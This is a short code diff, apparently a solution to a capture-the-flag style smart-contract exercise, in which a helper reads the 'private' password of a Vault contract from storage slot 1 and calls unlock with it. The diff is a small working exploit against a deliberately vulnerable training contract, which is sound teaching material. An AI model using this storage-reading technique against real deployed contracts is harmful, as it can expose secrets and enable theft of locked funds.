@@ -1,5 +1,3 @@
-import { expect } from "chai";
-import { ethers } from "hardhat";
 import { Vault } from "../../typechain-types";
 
 const helper = async (victim: Vault) => {
@@ -9,6 +7,11 @@ const helper = async (victim: Vault) => {
     Unlock the vault by somehow reading the private password from 
     Vault directly
   */
+  // location 0: boolean
+  // locoation 1: bytes32 password
+  let val = await victim.provider.getStorageAt(victim.address, 1);
+
+  await victim.unlock(val);
 };
 
 export default helper;
